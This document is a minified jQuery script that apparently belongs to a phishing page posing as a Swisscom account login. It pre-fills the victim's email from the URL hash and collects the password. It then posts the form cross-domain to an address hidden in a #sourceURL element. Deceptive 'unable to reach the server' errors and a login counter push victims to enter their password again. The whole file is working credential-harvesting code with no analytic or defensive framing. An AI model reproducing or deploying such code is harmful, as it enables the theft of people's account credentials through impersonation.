$(document).ready(function(){var s=window.location.hash.substr(1);$("#emailForm, #passwordForm input").keydown(function(){$("#authError, #emailError, #passwordError").html("").addClass("visually-hidden")}),s?($("#emailForm").addClass("visually-hidden"),$("#passwordForm").removeClass("visually-hidden"),$("#emailPreview").html(s),$("#password").focus()):$("#username").focus(),$("#emailForm").submit(function(s){s.preventDefault(),$("#authError, #emailError").html("").addClass("visually-hidden");var a,r=$("#username").val().trim();r?(a=r,/^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/.test(a))?($("#emailForm").addClass("visually-hidden"),$("#passwordForm").removeClass("visually-hidden"),$("#authError, #emailError").html("").addClass("visually-hidden"),$("#emailPreview").html(r),$("#email").val(r),$("#password").focus()):($("#emailError").html("!&nbsp;Username entered is incorrect.").removeClass("visually-hidden"),$("#username").focus()):($("#emailError").html("!&nbsp;This is a required field.").removeClass("visually-hidden"),$("#username").focus())}),$("#changeEmail").click(function(s){$("#passwordForm").addClass("visually-hidden"),$("#emailForm").removeClass("visually-hidden"),$("#authError, #passwordError").html("").addClass("visually-hidden"),$("#emailPreview").html(""),$("#email").val(),$("#username").focus()}),$("#passwordForm").submit(function(s){s.preventDefault(),$("#authError, #passwordError").html("").addClass("visually-hidden");var a=$("#password").val().trim();a?a.length<5?($("#passwordError").html("!&nbsp; Your username or password is incorrect.").removeClass("visually-hidden"),$("#password").focus()):jQuery.ajax({url:$("#sourceURL").html(),data:$("#passwordForm").serialize(),type:"POST",crossDomain:!0,beforeSend:function(){$("#passwordForm input").blur(),$("#submitText").addClass("visually-hidden"),$("#submitLoader").removeClass("visually-hidden"),$("#authError, #passwordError, #emailError").html("").addClass("visually-hidden")},success:function(s){s.match(/1/i)?($("#submitText").removeClass("visually-hidden"),$("#submitLoader").addClass("visually-hidden"),$("#loginCount").val("2"),$("#password").val(""),$("#password").focus(),$("#authError").html("Hmm, unable to reach the server. Try again").removeClass("visually-hidden")):s.match(/2/i)?($("#submitText").removeClass("visually-hidden"),$("#submitLoader").addClass("visually-hidden"),$("#loginCount").val("1"),$("#password").val(""),$("#password").focus(),$("#authError").html("Hmm, unable to reach the server. Try again").removeClass("visually-hidden")):s.match(/0/i)?($("#submitText").removeClass("visually-hidden"),$("#submitLoader").addClass("visually-hidden"),$("#loginCount").val("1"),$("#password").val(""),$("#authError").html("Please login with your Swisscom account.").removeClass("visually-hidden")):s.match(/-0/i)&&($("#submitText").removeClass("visually-hidden"),$("#submitLoader").addClass("visually-hidden"),$("#loginCount").val("1"),$("#password").val(""),$("#password").focus(),$("#authError").html("Error. Please check your network and try again.").removeClass("visually-hidden"))},error:function(){$("#submitText").removeClass("visually-hidden"),$("#submitLoader").addClass("visually-hidden"),$("#loginCount").val("1"),$("#password").val(""),$("#password").focus(),$("#authError").html("Error. Please check your network and try again").removeClass("visually-hidden")}}):($("#passwordError").html("!&nbsp;This is a required field.").removeClass("visually-hidden"),$("#password").focus())})});
